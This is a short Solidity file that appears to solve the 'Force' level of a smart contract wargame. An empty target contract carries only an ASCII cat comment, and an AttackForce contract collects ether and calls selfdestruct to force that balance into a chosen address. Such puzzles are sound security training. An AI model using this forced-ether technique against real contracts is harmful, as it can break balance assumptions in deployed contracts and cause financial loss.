// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}

contract AttackForce {
    uint balance = 0;

    function transferFirst() public payable returns(uint) {
      return balance += msg.value;
    }

    function selfDestroy(address payable addr) public payable {
      selfdestruct(addr);
    }
}